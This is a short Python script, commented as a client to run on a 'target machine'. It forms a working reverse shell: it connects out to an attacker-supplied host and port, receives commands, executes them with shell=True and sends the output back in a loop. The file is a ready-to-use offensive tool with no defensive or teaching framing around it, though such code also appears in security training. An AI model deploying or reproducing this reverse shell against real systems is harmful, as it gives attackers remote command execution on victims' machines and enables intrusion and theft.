# Client tcp for executing in target machine
import socket
import subprocess
import sys

# Address of attacker server 
attacker_host = sys.argv[1]
attacker_port = int(sys.argv[2])

# Socket creating
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Client connecting
client.connect((attacker_host, attacker_port))

# Sending data
while True:
    client.send(b"\n[reversesehll]$ ")
    command = client.recv(4096).decode().strip()
    if command .lower() == "exit":
        break
    
    try:
        output = subprocess.check_output(command, shell = True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        output = e.output
    client.send(output)

client.close()
